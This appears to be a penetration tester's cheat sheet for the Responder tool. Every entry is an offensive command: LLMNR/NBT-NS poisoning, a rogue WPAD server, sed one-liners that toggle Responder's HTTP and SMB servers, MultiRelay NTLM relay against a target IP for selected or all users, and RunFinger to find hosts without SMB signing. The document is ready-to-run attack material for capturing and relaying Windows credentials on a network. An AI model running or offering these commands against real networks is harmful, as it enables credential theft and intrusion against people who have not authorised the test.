# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## responder launch
```
responder –I eth0
```

## responder launch - analyze mode (no poisoning)
```
responder –I eth0 -A
```

## responder launch with wpad file 
```
responder -I eth0 --wpad
```

## responder http on
```
sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder http off
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder smb on
```
sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## responder smb off
```
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
```
multirelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
```
multirelay -t <ip> -u ALL
```

## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
```
runfinger -i <network_range>
```
